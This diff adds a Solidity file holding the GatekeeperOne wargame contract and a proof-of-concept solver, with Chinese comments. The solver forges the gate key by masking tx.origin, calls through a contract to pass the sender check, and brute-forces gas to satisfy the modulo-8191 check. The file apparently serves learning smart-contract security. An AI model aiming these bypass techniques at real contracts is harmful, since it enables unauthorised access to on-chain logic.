@@ -1,0 +1,87 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(
+            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
+            "GatekeeperOne: invalid gateThree part one"
+        );
+        require(
+            uint32(uint64(_gateKey)) != uint64(_gateKey),
+            "GatekeeperOne: invalid gateThree part two"
+        );
+        require(
+            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
+            "GatekeeperOne: invalid gateThree part three"
+        );
+        _;
+    }
+
+    function enter(
+        bytes8 _gateKey
+    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+
+contract GatekeeperOnePOC {
+    function checkGateKey(bytes8 _gateKey) public view returns (bytes8) {
+        require(
+            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
+            "GatekeeperOne: invalid gateThree part one"
+        );
+        require(
+            uint32(uint64(_gateKey)) != uint64(_gateKey),
+            "GatekeeperOne: invalid gateThree part two"
+        );
+        require(
+            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
+            "GatekeeperOne: invalid gateThree part three"
+        );
+        return _gateKey;
+    }
+
+    function gateKey() public view returns (bytes8) {
+        // & 0xFFFFFFFF0000FFFF 可以使
+        //   uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
+        //   uint32(uint64(_gateKey)) != uint64(uint64(_gateKey))
+        // 因为 16-32 之间的位已被置零
+        return bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
+    }
+
+    uint256 public ret;
+
+    // 注意部署编译器版本与本地环境编译器版本差异，因为编译出来的操作码不同，gas也会有差异
+    function crack(address instance, uint256 gasLimit) public {
+        GatekeeperOne(instance).enter{gas: gasLimit}(
+            bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF
+        );
+    }
+
+    function bingo(address instance) public {
+        bytes8 key = bytes8(uint64(uint160(address(tx.origin)))) &
+            0xFFFFFFFF0000FFFF;
+        for (uint256 i = 0; i <= 8191; i++) {
+            try GatekeeperOne(instance).enter{gas: 200000 + i}(key) returns (
+                bool
+            ) {
+                ret = 200000 + i;
+                return;
+            } catch {}
+        }
+    }
+}
